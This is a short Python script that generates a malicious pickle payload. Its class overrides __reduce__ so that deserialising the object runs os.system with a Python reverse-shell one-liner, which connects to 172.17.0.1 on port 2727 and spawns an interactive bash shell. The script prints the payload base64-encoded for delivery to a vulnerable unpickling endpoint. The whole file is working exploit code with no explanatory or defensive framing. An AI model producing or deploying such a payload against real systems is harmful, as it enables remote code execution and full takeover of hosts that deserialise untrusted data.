import pickle, os, base64

CMD = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",2727));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"""

class Evil:
    def __reduce__(self):
        return (os.system, (CMD,))

payload = pickle.dumps(Evil(), protocol=4)
print(base64.b64encode(payload).decode()) 
